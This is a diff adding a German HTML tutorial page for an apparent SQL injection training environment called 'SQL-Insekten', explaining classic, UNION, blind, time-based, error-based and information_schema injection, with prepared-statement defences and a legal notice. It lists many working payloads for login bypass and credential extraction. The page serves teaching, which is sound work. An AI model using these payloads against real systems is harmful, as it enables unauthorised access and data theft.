@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SQL-Insekten – Technische Methoden Guide</title>
+  <!-- Google Font: Inter -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+  <!-- Styles -->
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <!-- Sticky Navigation -->
+  <nav class="navbar flex justify-between items-center px-16 py-8">
+    <a href="#home" class="navbar__brand h5 m-0">
+      <span class="bug-icon">🐛</span>
+      SQL-Insekten Guide
+    </a>
+    <div class="flex items-center gap-16">
+      <a href="#home" class="navbar__link">Home</a>
+      <a href="#guide" class="navbar__link">Guide</a>
+      <a href="#methods" class="navbar__link">Methoden</a>
+      <a href="#faq" class="navbar__link">FAQ</a>
+      <a href="#legal" class="navbar__link">Rechtliches</a>
+      <button id="theme-toggle" class="btn btn--outline btn--sm" aria-label="Dark Mode umschalten">🌙</button>
+    </div>
+  </nav>
+
+  <!-- Hero Section -->
+  <header id="home" class="hero flex flex-col items-center justify-center text-center px-16 py-16">
+    <div class="hero__icon">🐛</div>
+    <h1 class="hero__title mt-8">SQL-Injection Methoden verstehen</h1>
+    <p class="hero__subtitle mt-8">Detaillierte technische Erklärungen zu SQL-Injection-Techniken – Wie sie funktionieren und warum sie wirken</p>
+    <a href="#methods" class="btn btn--primary btn--lg mt-8">Methoden verstehen</a>
+  </header>
+
+  <!-- SQL Injection Methods Section -->
+  <section id="methods" class="container py-16">
+    <h2 class="text-center mb-16">SQL-Injection Methoden</h2>
+    <div class="methods-grid">
+      <!-- Classic SQL Injection -->
+      <div class="method-card">
+        <div class="method-card__header">
+          <h3 class="method-card__title">Classic SQL Injection</h3>
+          <div class="method-card__type">Grundlegende Technik</div>
+        </div>
+        <div class="method-card__content">
+          <p class="method-card__description">Die grundlegendste Form der SQL-Injection durch String-Konkatenation</p>
+          
+          <div class="method-section">
+            <h4>Wie es funktioniert:</h4>
+            <div class="code-block">
+              <code>' OR '1'='1' --</code>
+            </div>
+            <p>Der Apostroph beendet den String, OR '1'='1' ist immer wahr, -- kommentiert den Rest aus</p>
+          </div>
+
+          <div class="method-section">
+            <h4>Verwundbarer Code:</h4>
+            <div class="code-block vulnerable">
+              <code>SELECT * FROM users WHERE username = '$username' AND password = '$password'</code>
+            </div>
+          </div>
+
+          <div class="method-section">
+            <h4>Sicherer Code:</h4>
+            <div class="code-block safe">
+              <code>SELECT * FROM users WHERE username = ? AND password = ?</code>
+            </div>
+          </div>
+
+          <div class="method-section">
+            <h4>Weitere Beispiele:</h4>
+            <div class="examples-grid">
+              <div class="example-item">
+                <code>' OR 1=1 --</code>
+                <span class="example-desc">Numerische Bedingung</span>
+              </div>
+              <div class="example-item">
+                <code>' OR 'a'='a' --</code>
+                <span class="example-desc">String-Vergleich</span>
+              </div>
+              <div class="example-item">
+                <code>admin' --</code>
+                <span class="example-desc">Gezielter Login</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- UNION SELECT Injection -->
+      <div class="method-card">
+        <div class="method-card__header">
+          <h3 class="method-card__title">UNION SELECT Injection</h3>
+          <div class="method-card__type">Datenextraktion</div>
+        </div>
+        <div class="method-card__content">
+          <p class="method-card__description">Kombiniert Ergebnisse aus verschiedenen Tabellen mit dem UNION-Operator</p>
+          
+          <div class="method-section">
+            <h4>Wie es funktioniert:</h4>
+            <div class="code-block">
+              <code>' UNION SELECT null, username, password FROM users --</code>
+            </div>
+            <p>UNION kombiniert Ergebnisse zweier SELECT-Statements mit gleicher Spaltenanzahl</p>
+          </div>
+
+          <div class="method-section">
+            <h4>Technische Details:</h4>
+            <ul class="technical-list">
+              <li><strong>Spaltenanzahl ermitteln:</strong> Mit ORDER BY testen</li>
+              <li><strong>UNION-Anforderungen:</strong> Gleiche Spaltenanzahl und kompatible Datentypen</li>
+              <li><strong>NULL-Werte:</strong> Zum Auffüllen verwenden</li>
+            </ul>
+          </div>
+
+          <div class="method-section">
+            <h4>Warum es funktioniert:</h4>
+            <p>Der SQL UNION-Operator kombiniert die Ergebnisse von zwei oder mehr SELECT-Statements. Die ursprüngliche Abfrage liefert ihre Ergebnisse, und unsere injizierte UNION-Abfrage fügt zusätzliche Daten hinzu.</p>
+          </div>
+
+          <div class="method-section">
+            <h4>Praktische Beispiele:</h4>
+            <div class="examples-grid">
+              <div class="example-item">
+                <code>' UNION SELECT 1, username, password FROM users --</code>
+                <span class="example-desc">Benutzerdaten extrahieren</span>
+              </div>
+              <div class="example-item">
+                <code>' UNION SELECT @@version, database(), user() --</code>
+                <span class="example-desc">Systeminfo abrufen</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Boolean-based Blind SQL Injection -->
+      <div class="method-card">
+        <div class="method-card__header">
+          <h3 class="method-card__title">Boolean-based Blind SQL Injection</h3>
+          <div class="method-card__type">Blind-Technik</div>
+        </div>
+        <div class="method-card__content">
+          <p class="method-card__description">Nutzt unterschiedliche Anwendungsverhalten bei True/False-Bedingungen</p>
+          
+          <div class="method-section">
+            <h4>Konzept:</h4>
+            <p>Verschiedene Bedingungen führen zu unterschiedlichen Anwendungsantworten</p>
+            <div class="comparison-grid">
+              <div class="comparison-item">
+                <div class="code-block">
+                  <code>' AND 1=1 --</code>
+                </div>
+                <span class="comparison-result success">Normale Antwort</span>
+              </div>
+              <div class="comparison-item">
+                <div class="code-block">
+                  <code>' AND 1=2 --</code>
+                </div>
+                <span class="comparison-result error">Keine Ergebnisse</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="method-section">
+            <h4>Warum es funktioniert:</h4>
+            <p>Die Anwendung reagiert unterschiedlich auf wahre und falsche Bedingungen. Durch systematisches Testen können Informationen extrahiert werden.</p>
+          </div>
+
+          <div class="method-section">
+            <h4>Erweiterte Beispiele:</h4>
+            <div class="examples-grid">
+              <div class="example-item">
+                <code>' AND (SELECT COUNT(*) FROM users) > 0 --</code>
+                <span class="example-desc">Tabellenexistenz prüfen</span>
+              </div>
+              <div class="example-item">
+                <code>' AND LENGTH(database()) > 5 --</code>
+                <span class="example-desc">Datenbanknamen-Länge</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Time-based Blind SQL Injection -->
+      <div class="method-card">
+        <div class="method-card__header">
+          <h3 class="method-card__title">Time-based Blind SQL Injection</h3>
+          <div class="method-card__type">Zeitbasierte Technik</div>
+        </div>
+        <div class="method-card__content">
+          <p class="method-card__description">Nutzt zeitbasierte Verzögerungen zur Informationsgewinnung</p>
+          
+          <div class="method-section">
+            <h4>Funktionsweise:</h4>
+            <div class="code-block">
+              <code>' OR IF(1=1, SLEEP(5), 0) --</code>
+            </div>
+            <p>Verzögerungen in der Antwortzeit zeigen erfolgreiche Injection an</p>
+          </div>
+
+          <div class="method-section">
+            <h4>Warum es funktioniert:</h4>
+            <p>Zeitbasierte Antworten sind messbar und können als Informationskanal genutzt werden. Wenn eine Bedingung wahr ist, wird eine Verzögerung ausgelöst.</p>
+          </div>
+
+          <div class="method-section">
+            <h4>Praktische Anwendung:</h4>
+            <div class="examples-grid">
+              <div class="example-item">
+                <code>' OR IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0) --</code>
+                <span class="example-desc">Tabelle existiert</span>
+              </div>
+              <div class="example-item">
+                <code>' OR IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0) --</code>
+                <span class="example-desc">Version prüfen</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Error-based SQL Injection -->
+      <div class="method-card">
+        <div class="method-card__header">
+          <h3 class="method-card__title">Error-based SQL Injection</h3>
+          <div class="method-card__type">Fehlerbasierte Technik</div>
+        </div>
+        <div class="method-card__content">
+          <p class="method-card__description">Nutzt Fehlermeldungen zur Informationsgewinnung</p>
+          
+          <div class="method-section">
+            <h4>Prinzip:</h4>
+            <p>Detaillierte Fehlermeldungen verraten Datenbankstrukturen</p>
+            <div class="code-block">
+              <code>' AND (SELECT COUNT(*) FROM information_schema.tables) --</code>
+            </div>
+          </div>
+
+          <div class="method-section">
+            <h4>Warum es funktioniert:</h4>
+            <p>Viele Datenbanken geben detaillierte Fehlermeldungen aus, die Informationen über Tabellen, Spalten und Datentypen preisgeben.</p>
+          </div>
+
+          <div class="method-section">
+            <h4>Erweiterte Techniken:</h4>
+            <div class="examples-grid">
+              <div class="example-item">
+                <code>' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) --</code>
+                <span class="example-desc">MySQL Version extrahieren</span>
+              </div>
+              <div class="example-item">
+                <code>' AND 1=CAST((SELECT @@version) AS INT) --</code>
+                <span class="example-desc">Type-Casting Fehler</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Information Schema Injection -->
+      <div class="method-card">
+        <div class="method-card__header">
+          <h3 class="method-card__title">Information Schema Injection</h3>
+          <div class="method-card__type">Metadaten-Extraktion</div>
+        </div>
+        <div class="method-card__content">
+          <p class="method-card__description">Nutzt Metadaten-Tabellen zur Datenbankstruktur-Erkundung</p>
+          
+          <div class="method-section">
+            <h4>Was ist information_schema:</h4>
+            <p>Eine standardisierte Metadaten-Datenbank, die Informationen über alle Tabellen, Spalten und Strukturen enthält.</p>
+          </div>
+
+          <div class="method-section">
+            <h4>Wichtige Tabellen:</h4>
+            <div class="info-schema-grid">
+              <div class="info-item">
+                <code>information_schema.tables</code>
+                <span>Alle Tabellennamen</span>
+              </div>
+              <div class="info-item">
+                <code>information_schema.columns</code>
+                <span>Spaltennamen und -typen</span>
+              </div>
+              <div class="info-item">
+                <code>information_schema.schemata</code>
+                <span>Datenbanknamen</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="method-section">
+            <h4>Warum es funktioniert:</h4>
+            <p>Die information_schema-Tabellen sind in den meisten SQL-Datenbanken verfügbar und enthalten standardisierte Metadaten über die Datenbankstruktur.</p>
+          </div>
+
+          <div class="method-section">
+            <h4>Praktische Beispiele:</h4>
+            <div class="examples-grid">
+              <div class="example-item">
+                <code>' UNION SELECT table_name, null FROM information_schema.tables --</code>
+                <span class="example-desc">Alle Tabellen auflisten</span>
+              </div>
+              <div class="example-item">
+                <code>' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users' --</code>
+                <span class="example-desc">Spalten einer Tabelle</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- URL-Encoding Section -->
+  <section id="url-encoding" class="container py-16">
+    <h2 class="text-center mb-16">URL-Encoding</h2>
+    <div class="encoding-grid">
+      <div class="encoding-card">
+        <h3>Warum URL-Encoding wichtig ist</h3>
+        <p>Sonderzeichen in URLs müssen kodiert werden, damit SQL-Injection-Payloads korrekt übertragen werden.</p>
+        
+        <div class="encoding-table">
+          <div class="encoding-row">
+            <span class="encoding-char">Leerzeichen</span>
+            <span class="encoding-code">%20</span>
+          </div>
+          <div class="encoding-row">
+            <span class="encoding-char">Anführungszeichen '</span>
+            <span class="encoding-code">%27</span>
+          </div>
+          <div class="encoding-row">
+            <span class="encoding-char">Gleichheitszeichen =</span>
+            <span class="encoding-code">%3D</span>
+          </div>
+          <div class="encoding-row">
+            <span class="encoding-char">Raute #</span>
+            <span class="encoding-code">%23</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="encoding-card">
+        <h3>Praktische Beispiele</h3>
+        <div class="encoding-examples">
+          <div class="encoding-example">
+            <div class="encoding-original">
+              <strong>Original:</strong>
+              <code>' OR '1'='1' --</code>
+            </div>
+            <div class="encoding-encoded">
+              <strong>URL-kodiert:</strong>
+              <code>%27%20OR%20%271%27%3D%271%27%20--</code>
+            </div>
+          </div>
+          <div class="encoding-example">
+            <div class="encoding-original">
+              <strong>Original:</strong>
+              <code>' UNION SELECT null, username FROM users --</code>
+            </div>
+            <div class="encoding-encoded">
+              <strong>URL-kodiert:</strong>
+              <code>%27%20UNION%20SELECT%20null,%20username%20FROM%20users%20--</code>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Technical Details Section -->
+  <section id="technical-details" class="container py-16">
+    <h2 class="text-center mb-16">Technische Details</h2>
+    
+    <div class="tech-section">
+      <h3>Prepared Statements: Wie sie SQL-Injection verhindern</h3>
+      <p>Prepared Statements trennen SQL-Code von Daten. Der Code wird vorkompiliert und Daten werden später als Parameter gebunden, wodurch eine Interpretation als SQL-Code verhindert wird.</p>
+      
+      <div class="code-examples">
+        <div class="code-example">
+          <h4>PHP</h4>
+          <div class="code-block safe">
+            <code>$stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
+$stmt->execute([$username, $password]);</code>
+          </div>
+        </div>
+        
+        <div class="code-example">
+          <h4>Python</h4>
+          <div class="code-block safe">
+            <code>cursor.execute('SELECT * FROM users WHERE username = %s AND password = %s', (username, password))</code>
+          </div>
+        </div>
+        
+        <div class="code-example">
+          <h4>Java</h4>
+          <div class="code-block safe">
+            <code>PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
+stmt.setString(1, username);
+stmt.setString(2, password);</code>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Extended Level Overview -->
+  <section id="guide" class="container py-16">
+    <h2 class="text-center mb-16">Erweiterte Level-Übersicht</h2>
+    <div id="guide-grid" class="guide-grid"></div>
+  </section>
+
+  <!-- FAQ Section -->
+  <section id="faq" class="container py-16">
+    <h2 class="mb-16 text-center">Häufig gestellte Fragen</h2>
+    <div class="faq-list flex flex-col gap-8">
+      <details class="card">
+        <summary class="card__header h6">Wie ermittle ich die richtige Spaltenanzahl für UNION SELECT?</summary>
+        <div class="card__body">
+          <p>Verwende die ORDER BY-Klausel, um die Spaltenanzahl zu ermitteln:</p>
+          <div class="code-block">
+            <code>' ORDER BY 1 --  (funktioniert)
+' ORDER BY 2 --  (funktioniert)
+' ORDER BY 3 --  (Fehler - zu viele Spalten)</code>
+          </div>
+          <p>Die höchste funktionierende Nummer ist deine Spaltenanzahl.</p>
+        </div>
+      </details>
+      
+      <details class="card">
+        <summary class="card__header h6">Warum funktioniert meine UNION SELECT-Injection nicht?</summary>
+        <div class="card__body">
+          <p>Häufige Probleme:</p>
+          <ul>
+            <li><strong>Falsche Spaltenanzahl:</strong> Beide SELECT-Statements müssen gleich viele Spalten haben</li>
+            <li><strong>Datentyp-Inkompatibilität:</strong> Verwende NULL-Werte für unbekannte Typen</li>
+            <li><strong>Fehlende Kommentare:</strong> Vergiss nicht das -- am Ende</li>
+          </ul>
+        </div>
+      </details>
+      
+      <details class="card">
+        <summary class="card__header h6">Wie nutze ich information_schema effektiv?</summary>
+        <div class="card__body">
+          <p>Systematisches Vorgehen:</p>
+          <ol>
+            <li><strong>Datenbanken finden:</strong> <code>SELECT schema_name FROM information_schema.schemata</code></li>
+            <li><strong>Tabellen finden:</strong> <code>SELECT table_name FROM information_schema.tables</code></li>
+            <li><strong>Spalten finden:</strong> <code>SELECT column_name FROM information_schema.columns WHERE table_name='users'</code></li>
+          </ol>
+        </div>
+      </details>
+      
+      <details class="card">
+        <summary class="card__header h6">Was mache ich, wenn Semikolons gefiltert werden?</summary>
+        <div class="card__body">
+          <p>Vermeide zusätzliche Statements und arbeite nur mit UNION SELECT:</p>
+          <div class="code-block">
+            <code>' UNION SELECT username, password FROM users --</code>
+          </div>
+          <p>Anstatt zu versuchen, Tabellen zu löschen, fokussiere dich auf Datenextraktion.</p>
+        </div>
+      </details>
+      
+      <details class="card">
+        <summary class="card__header h6">Wie funktioniert Blind SQL Injection in der Praxis?</summary>
+        <div class="card__body">
+          <p>Blind SQL Injection erfordert systematisches Testen:</p>
+          <div class="code-block">
+            <code>' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1) = 'a' --</code>
+          </div>
+          <p>Durch schrittweises Testen jedes Zeichens können Daten extrahiert werden.</p>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- Legal Notice -->
+  <section id="legal" class="legal-banner px-16 py-16">
+    <h2 class="text-center mb-8">⚠️ Rechtlicher Hinweis</h2>
+    <div class="legal-content">
+      <p class="text-center"><strong>Alle gezeigten Techniken dürfen nur in sicheren Lernumgebungen wie SQL-Insekten eingesetzt werden.</strong></p>
+      <p class="text-center">Angriffe auf produktive Systeme ohne Berechtigung sind illegal und strafbar nach §202a StGB (Ausspähen von Daten) und §303a StGB (Datenveränderung).</p>
+      <p class="text-center">Diese Anleitung dient ausschließlich zu Bildungszwecken und zur Sensibilisierung für IT-Sicherheit.</p>
+    </div>
+  </section>
+
+  <!-- Level Details Modal -->
+  <div id="level-modal" class="modal hidden" role="dialog" aria-modal="true" aria-labelledby="level-modal-title">
+    <div class="modal__content card" tabindex="-1">
+      <div class="card__header flex justify-between items-center">
+        <h3 id="level-modal-title" class="m-0"></h3>
+        <button class="btn btn--outline btn--sm" id="level-modal-close" aria-label="Schließen">✕</button>
+      </div>
+      <div class="card__body">
+        <div id="level-modal-content">
+          <div class="method-info">
+            <h4>Verwendete Methode:</h4>
+            <div id="level-method" class="method-tag"></div>
+          </div>
+          <div class="payload-info">
+            <h4>Payload:</h4>
+            <div class="code-block">
+              <code id="level-payload"></code>
+            </div>
+          </div>
+          <div class="explanation-info">
+            <h4>Erklärung:</h4>
+            <p id="level-explanation"></p>
+          </div>
+          <div class="steps-info">
+            <h4>Schritt-für-Schritt:</h4>
+            <ol id="level-steps"></ol>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Script -->
+  <script src="app.js"></script>
+</body>
+</html>
